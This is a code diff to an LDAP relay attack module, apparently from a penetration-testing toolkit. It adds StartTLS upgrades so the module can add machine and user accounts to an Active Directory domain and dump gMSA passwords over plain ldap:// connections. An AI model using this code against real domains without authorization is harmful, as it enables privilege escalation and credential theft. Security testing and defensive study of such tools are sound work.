@@ -131,7 +131,13 @@ class LDAPAttack(ProtocolAttack):
         global alreadyAddedComputer
         if alreadyAddedComputer:
             LOG.error('New computer already added. Refusing to add another')
-            return
+            return False
+
+        if not self.client.tls_started and not self.client.server.ssl:
+            LOG.info('Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+            if not self.client.start_tls():
+                LOG.error('StartTLS failed')
+                return False
 
         # Get the domain we are in
         domaindn = domainDumper.root
@@ -193,6 +199,12 @@ class LDAPAttack(ProtocolAttack):
         if alreadyEscalated:
             LOG.error('New user already added. Refusing to add another')
             return
+
+        if not self.client.tls_started and not self.client.server.ssl:
+            LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+            if not self.client.start_tls():
+                LOG.error('StartTLS failed')
+                return False
 
         # Random password
         newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
@@ -899,6 +911,13 @@ class LDAPAttack(ProtocolAttack):
         #Dump gMSA Passwords
         if self.config.dumpgmsa:
             LOG.info("Attempting to dump gMSA passwords")
+
+            if not self.client.tls_started and not self.client.server.ssl:
+                LOG.info('Dumping gMSA password requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+                if not self.client.start_tls():
+                    LOG.error('StartTLS failed')
+                    return False
+
             success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
             if success:
                 fd = None
